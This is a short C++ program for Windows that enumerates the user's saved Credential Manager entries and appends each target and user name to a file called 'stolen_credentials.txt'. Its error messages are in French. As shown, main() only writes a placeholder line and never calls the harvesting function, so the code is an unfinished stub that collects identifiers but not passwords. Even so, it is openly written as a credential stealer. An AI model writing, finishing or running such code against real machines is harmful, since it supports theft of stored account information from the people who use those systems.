#include<stdio.h>
#include <fstream>
#include <windows.h>
#include <wincred.h>
#include <string>
#include <ctime>
#include <map>
#include <iostream>

#pragma comment(lib, "Advapi32.lib");

using namespace std;

void writeToFile(const string& filename, const string& data);
void listCredentials();

int main() {
    writeToFile("stolen_credentials.txt", "Here is some text to write to the file.");
}

void listCredentials() {
    DWORD count = 0;
    PCREDENTIAL *credentials = nullptr;

    if (CredEnumerate(NULL, 0, &count, &credentials)) {
        for (DWORD i = 0; i < count; i++) {
            PCREDENTIAL cred = credentials[i];
            string targetName = cred->TargetName ? reinterpret_cast<char*>(cred->TargetName) : "N/A";
            string userName = cred->UserName ? reinterpret_cast<char*>(cred->UserName) : "N/A";
            string credentialData = "Target: " + targetName + ", User: " + userName;

            writeToFile("stolen_credentials.txt", credentialData);
        }
        CredFree(credentials);
    } else {
        cerr << "Erreur lors de l'énumération des informations d'identification. Code d'erreur : " << GetLastError() << endl;
    }
}

void writeToFile(const string& filename, const string& data) {
    ofstream outfile(filename, ios::app);
    if (!outfile.is_open()) {
        cerr << "Erreur : impossible d'ouvrir le fichier :  " << filename << " ! " << endl;
        return;
    }

    outfile << data << endl;
    outfile.close();
    cout << "Data written to " << filename << endl;
}
